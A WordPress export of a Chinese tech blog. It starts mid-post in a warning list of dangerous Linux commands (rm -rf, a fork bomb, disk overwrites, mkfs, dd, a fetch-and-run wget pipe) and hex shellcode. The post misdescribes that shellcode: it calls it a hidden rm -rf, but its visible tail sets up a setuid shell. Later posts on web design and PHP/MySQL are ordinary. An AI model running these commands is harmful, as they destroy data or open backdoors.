	<li>rm -rf . : 强制删除当前文件夹及其子文件夹。</li>
</ul>
从 现在起，当你要执行rm -rf命令时请留心一点。我们可以在“.bashrc”文件对‘rm‘命令创建rm -i的别名，来预防用 ‘rm‘命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用-f参数前一定考虑好 你在做什么！译者本人有着血泪的教训啊。）
<strong>2. :(){:|:&amp;};: 命令</strong>
这就是个fork 炸弹的实例。具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。
:(){:|:&amp;};:
哦？你确认你要试试么？千万别在公司正式的<a target="_blank" rel="noopener noreferrer">服务器</a>上实验啊~~
<strong>3. 命令　&gt; /dev/sda</strong>
上列命令会将某个‘命令‘的输出写到块设备/dev/sda中。该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。
<strong>4. mv 文件夹 /dev/null</strong>
这 个命令会移动某个‘文件夹‘到/dev/null。在Linux中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。（译注：这就是黑洞啊。当然，要说明的是，通过将文件夹移动到黑洞，并不能阻止 数据恢复软件的救赎，所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成——我知道你肯定有些东西想删除得干干净净的。）
# mv /home/user/* /dev/null
上列命令会将User目录所有内容移动到/dev/null，这意味着所有东西都被‘卷入’黑洞　(null)之中。
<strong>5. wget http://malicious_source -O- | sh</strong>
上列命令会从一个（也许是）恶意源下载一个脚本并执行。Wget命令会下载这个脚本，而sh会（无条件的）执行下载下来的脚本。
注意: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。（译注：所以，你真的知道你在做什么吗？当遇到这种需要是，我的做法是，先wget下来，然后我去读一读其中到底写了些什么，然后考虑是否执行。）
<strong>6. mkfs.ext3 /dev/sda</strong>
上列命令会格式化块设备‘sda’，你无疑知道在执行上列命令后你的块设备(<a target="_blank" rel="noopener noreferrer">硬盘</a>驱 动器)会被格式化，崭新的!没有任何数据，直接让你的系统达到不可恢复的阶段。（译注：通常不会直接使用/dev/sda这样的设备，除非是作为raw设 备使用，一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁 灭性的，上面的数据都会被蒸发了。）
<strong>7. &gt; file</strong>
上列命令常用来清空文件内容（译注：通常也用于记录命令输出。 不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。另外，我想你可能真正想用的是 “&gt;&gt;”，即累加新的输出到文件，而不是刷新那个文件。）。如果用上列执行时输入错误或无知的输入类似 “&gt;xt.conf”　的命令会覆盖配置文件或其他任何的系统配置文件。
<strong>8. ^foo^bar</strong>
这个命令在我们<a href="http://linux.cn/article-2284-1.html" target="_blank" rel="noopener noreferrer">十个鲜为人知的 Linux 命令 – Part 3</a>中描述过，用来编辑先前运行的命令而无需重打整个命令。但当用foobar命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。（译注：事实上，这种小技巧是译者认为的，少数史前时代遗留下来的无用而有害的“黑客”技巧。）
<strong>9. dd if=/dev/random of=/dev/sda</strong>
上列命令会向块设备sda写入随机的垃圾文件从而擦出数据。当然！你的系统可能陷入混乱和不可恢复的状态。（译注：记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。）
<strong>10. 隐藏命令</strong>
下面的命令其实就是上面第一个命令 (rm -rf)。这里的代码是隐藏在十六进制里的,一个无知的用户可能就会被愚弄。在终端里运行下面命令可能会擦除你的根分区。
这个命令表明通常真正的危险是隐藏的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。不要编译／运行从未知来源的代码。
<pre class="lang:sh decode:true ">char esp[] __attribute__ ((section(“.text”))) /* e.s.prelease */= “\xeb\x3e\x5b\x31\xc0
\x50\x54\x5a\x83\xec\x64\x68″“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″“
\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″“\x56\x04\xf7\x56\x08\xf7\x56
\x0c\x83\xc4\x74\x56″“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″“\xc0
\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″“\x6e\x2f\x73\x68\x00\x2d\x63
\x00″“cp -p /bin/sh /tmp/.beyond; chmod 4755/tmp/.beyond;”;</pre>
注意: 不要在你的或你的同学或学校的<a target="_blank" rel="noopener noreferrer">电脑</a>里的Linux终端或Shell执行以上的任何一个命令。如果你想测试它们，请在虚拟机上运行。任何不和谐或数据丢失，由于运行上面的命令导致你的系统崩溃，文章作者和Tecmint概不负责。（译注：译者和转载网站也不负责~！）]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>140</wp:post_id>
		<wp:post_date><![CDATA[2014-07-17 02:49:25]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-07-17 02:49:25]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%b0%b8%e8%bf%9c%e4%b8%8d%e8%a6%81%e5%9c%a8-linux-%e6%89%a7%e8%a1%8c%e7%9a%84-10-%e4%b8%aa%e6%9c%80%e5%8d%b1%e9%99%a9%e7%9a%84%e5%91%bd%e4%bb%a4]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="post_tag" nicename="shell"><![CDATA[Shell]]></category>
		<category domain="category" nicename="xitong"><![CDATA[计算机系统]]></category>
						</item>
					<item>
		<title>两个宜于『统一Web』的方案：响应式与自适应</title>
		<link>http://wp.veitor.net/2014/07/30/%e4%b8%a4%e4%b8%aa%e5%ae%9c%e4%ba%8e-%e7%bb%9f%e4%b8%80web-%e7%9a%84%e6%96%b9%e6%a1%88-%e5%93%8d%e5%ba%94%e5%bc%8f%e4%b8%8e%e8%87%aa%e9%80%82%e5%ba%94/</link>
		<pubDate>Wed, 30 Jul 2014 05:39:14 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=147</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://storage.veitor.net/uploads/2014/07/1377683186626.jpg"><img class="aligncenter size-full wp-image-148" alt="1377683186626" src="http://storage.veitor.net/uploads/2014/07/1377683186626.jpg" width="960" height="290" /></a>你大概早就听别人说过我们正处在『后PC时代』。那么它对于Web开发者来说意味着什么呢？它意味着你那网站的30%到50%的流量如今已经来自移动设备。意味着很快，使用台式机和笔记本访问Web的人将逐渐减少。
（那么）我们该如何在用户行为上处理这种结构性转变？我们已经逾越了用M-dot或T-dot来hack的阶段，开始步入一个由响应式与自适应设计 技术统治的时代——即W3C联盟口中的统一化Web来临。W3C议案的关键部分在于『统一化Web意味着，在合理条件下，无论用户使用什么设备，要将相同 的信息与服务传达给他们。』
对于开发者来说，那就意味着统一化Web方案要确保你的站点不仅工作在今天的智能手机和平板电脑上，也要能应付未来那遥未可知的屏幕画面。
目前有三种流行性方案来开发网站：使用<a href="http://www.webmonkey.com/2013/01/take-responsive-design-beyond-media-queries/">响应式设计</a>、 客户端自适应、服务器端自适应。
这三种方案难分高下，每种都有其自身的优缺点。明智的Web开发者会在实施下一个项目之前权衡各自的利弊。
<h2>响应式Web设计</h2>
响应式Web设计是最常见的统一化Web方案。它使用<a href="http://www.webmonkey.com/2012/01/building-a-responsive-future-friendly-web-for-everyone/">CSS Media Queries</a>根据设备显示器的规格来调整网站的呈现方式。从<a href="http://www.webmonkey.com/2011/09/the-boston-globe-embraces-responsive-design/">波士顿环球报</a>到迪斯尼站点到Indochino西服网站，响应式站点的数量正在飞速增长。
这种方案的核心优势在于设计者可以为所有设备使用同一模板，仅用CSS来定制不同大小屏幕上内容的呈现方式即可。
然而，一个良好的响应式设计没什么捷径可言。要迈向响应式，团队通常需要进行完全的站点重建。
在设计和测试阶段会非常繁琐，保证为每种可能的设备或内容定制用户体验很困难。我们都见过那样一堆看起来一点儿都不吻合的碎片拼图站点。在移动用户优先考虑的开发过程中，响应式站点设计可以与设备结合得很融洽。对于平板和手提电脑来说，（响应式设计）则<a href="http://www.webmonkey.com/2012/03/video-progressive-enhancement-2-0/">更有优势</a>。
对响应式站点来说，性能也很可怕。在Mobify公司，我们近期完成了一项对15个流行的响应式电子商务站点的分析。在这些站点中，主页平均加载87个资源、1.9MB的数据量。一些响应式页面可以大到15MB。
之所以数据量这么大是因为响应式方案需考虑到所有设备。你的用户只使用一种设备，但是不得不在使用前等待所有的页面元素和资源加载才行。简单来说，性能影响你的底线。在智能手机端，当用户不得不等上一秒时，转化率会<a href="http://www.webperformancetoday.com/2011/11/23/case-study-slow-page-load-mobile-business-metrics/">额外降低3.5%</a>。若是达到3秒大关，<a href="http://www.strangeloopnetworks.com/resources/infographics/web-performance-and-user-expectations/website-abandonment-happens-after-3-seconds/">57%的用户</a>会彻底离开你的站点。
当响应式设计迅速成为普遍的标准时，也为在线电商带来了新的挑战，包括怎样处理图片、怎样优化移动端性能，并且当采用移动优先的方案时，通常意味着网站必须推倒重建。
<h2>客户端自适应</h2>
客户端自适应秉承着『为定制的设备
内容传达响应式设计用户体验』的原则。它采用JavaScript丰富站点的功能和独特性。比如，自适应站点只为Retina显示器（比如新款iPad）提供Retina质量的图片，而标准精度显示器接收低质量图片。
自适应设计有两种方案：一种是在客户端生效，在用户的浏览器上；另一种是由Web服务器负荷来检测设备类型并加载正确模板。客户端自适应类型的网站 案例包括个性T恤Threadless和奢侈品闪购ideeli。自适应模板方案的优势在于其复用HTML和JavaScript的能力，简化了项目管理 和测试的更迭。
客户端响应方案意味着你不必完全重构网站。相反你可以基于已有内容布局移动响应。对于专家级开发者而言，这种方案也可以让你针对指定设备或屏幕分辨 率。例如，对Mobify的大多在线时尚零售客户而言，95%的移动端流量来自iPhone。客户端自适应意味着他们可以专门针对苹果智能手机进行优化。
与响应式设计不同，自适应模板确保客户端设备只加载所需资源。因为对设备和特性的检测已经转移到了移动设备自身，类似Akamai和Edgecast的内容分发网络可以在不影响用户体验的情况下使用他们大部分的缓存功能。
客户端自适应比起响应式设计而言有着更高的壁垒。开发者用这项技术需要熟练掌握JavaScript，也依托于网站现有的模板为基础。最后，因为客户端自适应作为现有底层代码上的覆盖物，你需要在网站迁移时让它们作为一个整体。
<h2>服务器端自适应</h2>
依赖于服务器插件和自定义用户代理检测器我们也可以通过多种途径得到服务器端自适应方案。使用服务器端自适应的网站包括Etsy，One Kings Lane和OnlineShoes.com。
为什么要选择服务器端自适应？它通常针对每个设备提供独特的模板，允许更多的定制。并且这种方案把设备检测逻辑块放在服务器上，使得小型移动页面加载得更快。除此之外，对于像Magneto这种常见的CMS和电子商务系统来说，还有多种多样可用的服务器端插件。
这种方案不适用于小心脏——通常需要你大幅度改变后端系统，实施起来将会是冗长（和昂贵）的。管理多种模板需要有持续不断的维护成本。最后，当服务 器过载时这种方案还会带来性能问题。当服务器上加载移动用户代理检测器的时候，需要关掉许多部署在CDN上的缓存机制，像Akamai一样，这将导致移动 端和桌面访客的用户体验速率降低。
当然，许多公司仍然在跟响应的基本要领角力，显然还没有准备好面对重口味的自适应。然而，随着竞争的加剧和移动通信流量的上涨，越来越多的团队将在所有三个方法上浅尝辄止，（最终）择出一个最适合他们用户的方案。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>147</wp:post_id>
		<wp:post_date><![CDATA[2014-07-30 05:39:14]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-07-30 05:39:14]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%b8%a4%e4%b8%aa%e5%ae%9c%e4%ba%8e-%e7%bb%9f%e4%b8%80web-%e7%9a%84%e6%96%b9%e6%a1%88-%e5%93%8d%e5%ba%94%e5%bc%8f%e4%b8%8e%e8%87%aa%e9%80%82%e5%ba%94]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="js"><![CDATA[JS]]></category>
		<category domain="post_tag" nicename="%e5%93%8d%e5%ba%94%e5%bc%8f"><![CDATA[响应式]]></category>
		<category domain="post_tag" nicename="%e8%87%aa%e9%80%82%e5%ba%94"><![CDATA[自适应]]></category>
						</item>
					<item>
		<title>PHP_SELF，SCRIPT_NAME，SCRIPT_FILENAME，PATH_INFO，REQUEST_URI的区别</title>
		<link>http://wp.veitor.net/2014/08/05/php_self-script_name-script_filename-path_info-request_uri%e7%9a%84%e5%8c%ba%e5%88%ab/</link>
		<pubDate>Tue, 05 Aug 2014 00:35:05 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=160</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>前言</h3>
<a title="PHP Hypertext Preprocessor" href="http://www.php.net">PHP</a>的<a title="$_SERVER" href="http://cn2.php.net/reserved.variables.server.php">$_SERVER</a>数组中存在五个和路径相关的变量：<code>PHP_SELF</code>，<code>SCRIPT_NAME</code>，
<code>SCRIPT_FILENAME</code>，<code>PATH_INFO</code>，<code>REQUEST_URI</code>，这五个变量经常会被混淆，做下区分。
<h3>测试环境</h3>
Nginx0.8.54 + FastCGI + PHP5.3.4
要先配置Nginx的<code>PATH_INFO</code>，在<code>nginx.conf</code>中加入如下配置：
<pre><code>location ~ .* .php {
    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    #从$fastcgi_script_name中分离出真正执行的脚本名称和PATH_INFO
    set $real_script_name $fastcgi_script_name;
    if ($fastcgi_script_name ~ "^(.+?.php)(/.+)$") {
        set $real_script_name $1;
        set $path_info $2;
     }
    #重新设置SCRIPT_FILENAME
    fastcgi_param SCRIPT_FILENAME $document_root$real_script_name;
    fastcgi_param  QUERY_STRING       $query_string;
    fastcgi_param  REQUEST_METHOD     $request_method;
    fastcgi_param  CONTENT_TYPE       $content_type;
    fastcgi_param  CONTENT_LENGTH     $content_length;
    #重新设置SCRIPT_NAME
    fastcgi_param SCRIPT_NAME $real_script_name;
    fastcgi_param PATH_INFO $path_info;
    fastcgi_param  REQUEST_URI        $request_uri;
    fastcgi_param  DOCUMENT_URI       $document_uri;
    fastcgi_param  DOCUMENT_ROOT      $document_root;
    fastcgi_param  SERVER_PROTOCOL    $server_protocol;
    fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
    fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
    fastcgi_param  REMOTE_ADDR        $remote_addr;
    fastcgi_param  REMOTE_PORT        $remote_port;
    fastcgi_param  SERVER_ADDR        $server_addr;
    fastcgi_param  SERVER_PORT        $server_port;
    fastcgi_param  SERVER_NAME        $server_name;
    # PHP only, required if PHP was built with --enable-force-cgi-redirect
    fastcgi_param  REDIRECT_STATUS    200;
}
</code></pre>
我们的根目录为<code>/var/www</code>，测试域名为<code>example.com</code>（不过这个域名只能改<code>hosts</code>文件YY一下了），结构如下：
<pre><code>var
 |---www
       |---test
             |---test.php
</code></pre>
<h3>测试脚本</h3>
使用如下脚本进行测试：
<pre><code>&lt;?php
    echo 'SCRIPT_NAME=' . $_SERVER['SCRIPT_NAME'] . '&lt;br /&gt;';
    echo 'SCRIPT_FILENAME=' . $_SERVER['SCRIPT_FILENAME'] . '&lt;br /&gt;';
    echo 'PATH_INFO=' . $_SERVER['PATH_INFO'] . '&lt;br /&gt;';
    echo 'REQUEST_URI=' . $_SERVER['REQUEST_URI'] . '&lt;br /&gt;';
?&gt;
</code></pre>
<h3>测试结果</h3>
<ul>
	<li>PHP_SELF: 当前所执行的脚本的文件名，这个值是相对于根目录来说。
如果请求<strong>http://example.com/test/test.php?k=v</strong>，则<code>PHP_SELF</code>的值为
<strong>/test/test.php</strong>。</li>
	<li>SCRIPT_NAME： 当前执行的脚本的路径。
如果请求<strong>http://example.com/test/test.php?k=v</strong>，则<code>SCRIPT_NAME</code>的值
为<strong>/test/test.php</strong>。这个变量是在<a title="CGI/1.1" href="http://tools.ietf.org/html/rfc3875">CGI/1.1</a>中定义的。</li>
	<li>SCRIPT_FILENAME： 当前执行的脚本的绝对路径。
如果请求<strong>http://example.com/test/test.php?k=v</strong>，则<code>SCRIPT_FILENAME</code>的值
为<strong>/var/www/test/test.php</strong>。
注意：如果一个脚本以相对路径，<a title="PHP CLI" href="http://php.net/manual/en/features.commandline.php">CLI</a>方式来执行，例如<strong>../test/test.php</strong>，那么
<code>$_SERVER['SCRIPT_FILENAME']</code>的值为相对路径，即<strong>../test/test.php</strong>。</li>
	<li>PATH_INFO：客户端提供的路径信息，即在实际执行脚本后面尾随的内容，但是会去掉<strong>Query String</strong>。
如果请求<strong>http://example.com/test/test.php/a/b?k=v</strong>，则<code>PATH_INFO</code>的值为<strong>/a/b</strong>。
<a title="CGI/1.1" href="http://tools.ietf.org/html/rfc3875">CGI1.1</a>标准中如下描述："<strong>The PATH_INFO string is the trailing part of thecomponent of the script URI that follows the SCRIPT_NAME part of the path.</strong>"</li>
	<li>REQUEST_URI：包含HTTP协议中定义的URI内容。
如果请求<strong>http://example.com/test/test.php?k=v</strong>，则<code>REQUEST_URI</code>
为<strong>/test/test.php?k=v</strong></li>
</ul>
<h3>区别</h3>
<ul>
	<li>PHP_SELF VS SCRIPT_NAME：
<code>PHP_SELF</code>和<code>SCRIPT_NAME</code>的值在大部分情况下都是一样的，但是访问
<strong>http://example.com/test/test.php/a/b?k=v</strong>这类URL时候，<code>PHP_SELF</code>
为<strong>/test/test.php/a/b</strong>，<code>SCRIPT_NAME</code>为<strong>/test/test.php</strong>，可以看出<code>PHP_SELF</code>
比<code>SCRIPT_NAME</code>多了<code>PATH_INFO</code>的内容。</li>
	<li>REQUEST_URI VS SCRIPT_NAME：
在访问<strong>http://example.com/test/test.php?k=v</strong>后，<code>REQUEST_URI</code>
为<strong>/test/test.php?k=v</strong>，<code>SCRIPT_NAME</code>为<strong>/test/test.php</strong>，可以看出<code>REQUEST_URI</code>
比<code>SCRIPT_NAME</code>多了<strong>Query String</strong>。
如果<strong>http://example.com/test/test.php</strong>在服务器端做了<strong>rewrite</strong>：
<pre><code>  rewrite /test/test.php /test/test2.php;
</code></pre>
那么<code>REQUEST_URI</code>为<strong>/test/test.php</strong>，<code>SCRIPT_NAME</code>为<strong>/test/test2.php</strong>。</li>
</ul>
<h3>参考</h3>
<a href="http://tools.ietf.org/html/draft-robinson-www-interface-00">http://tools.ietf.org/html/draft-robinson-www-interface-00</a>
<a href="http://stackoverflow.com/questions/279966/php-self-vs-path-info-vs-script-name-vs-request-uri">http://stackoverflow.com/questions/279966/php-self-vs-path-info-vs-script-name-vs-request-uri</a>
<a href="http://ca.php.net/manual/en/reserved.variables.server.php">http://ca.php.net/manual/en/reserved.variables.server.php</a>
(完)]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>160</wp:post_id>
		<wp:post_date><![CDATA[2014-08-05 00:35:05]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-08-05 00:35:05]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php_self-script_name-script_filename-path_info-request_uri%e7%9a%84%e5%8c%ba%e5%88%ab]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="%e8%b7%af%e5%be%84"><![CDATA[路径]]></category>
						</item>
					<item>
		<title>用mysql_unbuffered_query函数取大数据</title>
		<link>http://wp.veitor.net/2014/08/13/%e7%94%a8mysql_unbuffered_query%e5%87%bd%e6%95%b0%e5%8f%96%e5%a4%a7%e6%95%b0%e6%8d%ae/</link>
		<pubDate>Wed, 13 Aug 2014 12:52:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=166</guid>
		<description></description>
		<content:encoded><![CDATA[昨天在做项目的时候，因为涉及到数据表结构的改动，需要进行大量数据的导入，那么如何高效的进行是我比较关注的。本文暂且从使用PHP脚本层面上来说，因为使用其他语言或其他方式也可以进行数据的重导。
在讨论这个问题的时候，前辈给我的意见就是单独做一个脚本，如果能拿python做更好，当然，python我还不是很会，所以拿php也能完成。既然这样，就采用最原生的方式来进行数据的重导。
整个过程中要先从一张表中取出全部数据，再进行数据的处理后导入到新的数据表中。而就我测试的那个数据库中的那张表里，数据量就已经上万了，如果直接全部取出必定会有性能上的问题。
他人给我的建议是，使用mysql_connect后用mysql_query执行sql（取大数据的情况如sele ct * from tbl）语句，理由是mysql_query不是返回的数据结果，因为后面用到mysql_fetch_assoc之类的函数，进行游标的移动来取得数据。并在sql执行前后分别使用了memory_get_usage来查看内存使用量。当然，执行后内存使用量比执行前大了，虽然使用了不多的内存，但对于只是测试数据库里的数据而言还行，当数据处理量很大的时候，php程序脚本可能会崩溃。为了确保重导真正线上数据库的数据万无一失，我还是查了一些相关资料。
最后了解到PHP中有个mysql_unbuffered_query这个函数，与mysql_query有点类似，手册上写了该函数不缓存的查询结果，它所带来的好处就是<strong>一不用缓存结果，二就是不必等待全部查询后进行操作，而是直接获取一条数据就可以操作</strong>。而mysql_query是查询出所有符合条件的结果并缓存后才能进行操作，这就让我怀疑之前建议的那个方法。
于是我同样用mysql_unbuffered_query查询同样一条sql语句，也同样对执行前后查看了内存使用量，结果前后内存使用量没有变，这就说明了内存并没有被拿来做查询数据缓存的相关事情。当然也可以使用以下方法来测试：
<pre class="show-plain-default:true decode-attributes:false trim-whitespace:false trim-code-tag:false lang:php decode:true">   $link = mysql_con nect('localhost','root','root');
   mysql_select_ db('phpcms');
   $sql = "SEL ECT * FROM `phpcms_content`";
   //$result = mysql_unbuffered_query($sql,$link);
   $result = mysql_query($sql,$link);
   while ($row = mysql_fe tch_array($result, MYSQL_NUM)) {
      printf ("ID: %s Name: %s", $row[0], $row[1]);
   }
   mysql_data_seek($result,0);
   echo "&lt;br/&gt;";
   while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
      printf ("ID: %s Name: %s", $row[0], $row[1]);
   }
    mysql_free_result($result);</pre>
你会发现使用mysql_query会输出两次，而mysql_unbuffered_query只输出一次，说明使用mysql_query查询结果必定被缓存了，而使用mysql_unbuffered_query则边进行查询边给出结果。
最后再说明，使用mysql_unbuffered_query的话，不能使用mysql_num_rows()和mysql_data_seek()这也正因为它的特性方式决定了这样。还有比较重要的一点，如果你只是单单获取大数据量使用这个函数可以，<strong>但是，如果你在取得大数据的时候，使用while($row = mysql_fetch_assoc($result))方式进行执行新的sql语句的话，会出错。手册上也写明了，在执行一条心的sql之前，要提取所有未缓存的sql查询所产生的行。</strong>所以只使用mysql_unbuffered_query取数据可以，但期间还要执行其他sql就不行了。
以上只是我对这个函数的初步认识，如果理解有误，也希望能指正交流。
&nbsp;
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>166</wp:post_id>
		<wp:post_date><![CDATA[2014-08-13 12:52:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-08-13 12:52:04]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e7%94%a8mysql_unbuffered_query%e5%87%bd%e6%95%b0%e5%8f%96%e5%a4%a7%e6%95%b0%e6%8d%ae]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[mysql]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>wordpress文章带图片同步到新浪微博</title>
		<link>http://wp.veitor.net/2014/08/18/wordpress%e6%96%87%e7%ab%a0%e5%b8%a6%e5%9b%be%e7%89%87%e5%90%8c%e6%ad%a5%e5%88%b0%e6%96%b0%e6%b5%aa%e5%be%ae%e5%8d%9a/</link>
		<pubDate>Mon, 18 Aug 2014 14:13:59 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=234</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://storage.veitor.net/uploads/2014/08/1392117921664.jpg"><img class="size-full wp-image-240 aligncenter" alt="1392117921664" src="http://storage.veitor.net/uploads/2014/08/1392117921664.jpg" width="600" height="396" /></a>
今天终于能把个人博客上的文章及文中图片一起同步到新浪微博了，在此发文纪念一下，并带图同步到我的微博测试。并且与大家一起分享一下经验，想必也有很多朋友在同步到微博的时候，遇到了传图的问题。
此前我都是使用多说评论框的接口同步到微博的，但为了能拥有自己的微博来源小尾巴，就自己开发一个。
首先你当然得有微博开放平台的帐号，并申请通过了网站应用审核。其次就是调用API接口了。
新浪微博有个高级接口，能发布一条微博并指定上传图片的url，这个接口由于需要申请使用，比较麻烦，还不如自己用另一个接口来实现锻炼一下自己。这里我使用的是<span class="lang:php decode:true  crayon-inline ">https://upload.api.weibo.com/2/statuses/upload.json</span> 这个接口（<a href="http://open.weibo.com/wiki/2/statuses/upload" target="_blank" rel="noopener noreferrer">详情见这</a>）
<table width="100%" border="1" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<th width="10%"></th>
<th width="5%">必选</th>
<th width="10%">类型及范围</th>
<th width="75%">说明</th>
</tr>
<tr>
<td>source</td>
<td>false</td>
<td>string</td>
<td>采用OAuth授权方式不需要此参数，其他授权方式为必填参数，数值为应用的AppKey。</td>
</tr>
<tr>
<td>access_token</td>
<td>false</td>
<td>string</td>
<td>采用OAuth授权方式为必填参数，其他授权方式不需要此参数，OAuth授权后获得。</td>
</tr>
<tr>
<td>status</td>
<td>true</td>
<td>string</td>
<td>要发布的微博文本内容，必须做URLencode，内容不超过140个汉字。</td>
</tr>
<tr>
<td>visible</td>
<td>false</td>
<td>int</td>
<td>微博的可见性，0：所有人能看，1：仅自己可见，2：密友可见，3：指定分组可见，默认为0。</td>
</tr>
<tr>
<td>list_id</td>
<td>false</td>
<td>string</td>
<td>微博的保护投递指定分组ID，只有当visible参数为3时生效且必选。</td>
</tr>
<tr>
<td>pic</td>
<td>true</td>
<td>binary</td>
<td>要上传的图片，仅支持JPEG、GIF、PNG格式，图片大小小于5M。</td>
</tr>
<tr>
<td>lat</td>
<td>false</td>
<td>float</td>
<td>纬度，有效范围：-90.0到+90.0，+表示北纬，默认为0.0。</td>
</tr>
<tr>
<td>long</td>
<td>false</td>
<td>float</td>
<td>经度，有效范围：-180.0到+180.0，+表示东经，默认为0.0。</td>
</tr>
<tr>
<td>annotations</td>
<td>false</td>
<td>string</td>
<td>元数据，主要是为了方便第三方应用记录一些适合于自己使用的信息，每条微博可以包含一个或者多个元数据，必须以json字串的形式提交，字串长度不超过512个字符，具体内容可以自定。</td>
</tr>
<tr>
<td>rip</td>
<td>false</td>
<td>string</td>
<td>开发者上报的操作用户真实IP，形如：211.156.0.1。</td>
</tr>
</tbody>
</table>
文档规定的参数有以上这些，我只用到了source、status和pic三个参数就行了，当然你可以获得access_token来代替source（本文使用source讲解）。
上传图片等流媒体文件需要使用<strong>multipart/form-data</strong>编码方式，这和我们平常使用的表单上传文件类似。提交时会向服务器端发出这样的数据（如下代码，已经去除部分不相关的头信息）。
<pre class="theme:ado lang:php decode:true">POST / HTTP/1.1
Content-Type:application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Host: weibo.com
Content-Length: 21
Connection: Keep-Alive
Cache-Control: no-cache
txt1=hello&amp;amp;txt2=world</pre>
对于普通的HTML Form POST请求，它会在头信息里使用Content-Length注明内容长度。头信息每行一条，空行之后便是Body，即“内容”（entity）。它的Content-Type是application/x-www-form-urlencoded，这意味着消息内容会经过URL编码，就像在GET请 求时URL里的QueryString那样。txt1=hello&amp;txt2=world
最早的HTTP POST是不支持文件上传的，给编程开发带来很多问题。但是在1995年，ietf出台了rfc1867,也就是《RFC 1867 -Form-based File Upload in HTML》，用以支持文件上传。所以Content-Type的类型扩充了multipart/form-data用以支持向服务器发送二进制数据。因此发送post请求时候，表单
